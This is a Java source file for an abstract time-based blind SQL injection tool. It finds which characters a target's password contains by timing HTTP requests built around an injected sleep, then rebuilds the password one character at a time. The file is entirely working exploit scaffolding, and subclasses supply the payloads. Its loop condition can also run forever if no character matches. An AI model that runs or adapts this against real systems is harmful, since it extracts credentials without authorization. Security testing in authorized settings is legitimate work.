package sqlInjection.blind;

import sqlInjection.responseReader.HttpURLConnectionResponseReader;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

public abstract class AbstractTotalBlindSqlInjectionPasswordGuesser {

    private final int secondsToSleep;
    private final int passwordLength;
    private final HttpURLConnectionResponseReader responseReader;
    private final OutputStream progressOutputStream;

    public AbstractTotalBlindSqlInjectionPasswordGuesser(int secondsToSleep,
                                                         int passwordLength,
                                                         HttpURLConnectionResponseReader responseReader,
                                                         OutputStream progressOutputStream) {
        this.secondsToSleep = secondsToSleep;
        this.passwordLength = passwordLength;
        this.responseReader = responseReader;
        this.progressOutputStream = progressOutputStream;
    }

    public String doInjection() throws Throwable {
        List<Character> charsInPassword = getCharsInPassword();
        return guessPassword(charsInPassword);
    }

    private String guessPassword(List<Character> charsInPassword) throws Throwable{
        final long timeDifference = secondsToNano(secondsToSleep);
        String password = "";
        for(int i = 0; i < passwordLength || password.length() < passwordLength; i++){
            for(Character s: charsInPassword){
                String passwordBeginning = password.concat(s.toString());
                String body = getBodyForPasswordGuessing(passwordBeginning, secondsToSleep);
                if(isGuessSuccessful(body, timeDifference)){
                    password = passwordBeginning;
                }
            }
            System.gc();
            if(progressOutputStream != null){
                progressOutputStream.write(String.format("%s%n", password).getBytes(StandardCharsets.UTF_8));
            }
        }
        return password;
    }

    private List<Character> getCharsInPassword() throws Throwable{
        final long timeDifference = secondsToNano(secondsToSleep);
        List<Character> charsInPassword = new ArrayList<>();

        for (Character c : getAllowedCharacters()) {
            String body = getBodyForFilteringUsefulCharacters(c, secondsToSleep);
            if(isGuessSuccessful(body, timeDifference)){
                charsInPassword.add(c);
                if(progressOutputStream != null){
                    progressOutputStream.write(String.format("%s%n", c).getBytes(StandardCharsets.UTF_8));
                }
            }
        }
        return charsInPassword;
    }

    private boolean isGuessSuccessful(String body, long timeDifference) throws Throwable{
        long start = System.nanoTime();
        HttpURLConnection connection = getHttpURLConnection(body);
        responseReader.read(connection);
        connection.disconnect();
        long end = System.nanoTime();
        return end - start >= timeDifference;
    }

    protected abstract List<Character> getAllowedCharacters();

    protected abstract HttpURLConnection getHttpURLConnection(String body) throws Exception;

    protected abstract String getBodyForFilteringUsefulCharacters(Character passwordCharacter, int secondsToSleep);

    protected abstract String getBodyForPasswordGuessing(String passwordBeginning, int secondsToSleep);

    private static long secondsToNano(int seconds){
        return seconds * 1_000_000_000L;
    }

}
